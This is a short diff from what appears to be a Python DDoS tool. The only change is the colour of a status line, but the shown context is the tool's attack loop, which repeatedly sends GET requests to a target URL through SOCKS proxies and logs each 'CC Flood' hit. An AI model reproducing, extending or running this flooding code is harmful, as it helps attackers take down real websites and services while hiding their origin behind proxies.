@@ -211,7 +211,7 @@ def atk():
 				try:
 					for y in range(pwr):
 						s.get(url)
-						print(Fore.GREEN + "[+] Socks CC Flood From ~[ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.BLUE + " ] " + Fore.WHITE)
+						print(Fore.GREEN + "[+] Socks CC Flood From ~[ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.GREEN + " ] " + Fore.WHITE)
 					s.close
 				except:
 					s.close()
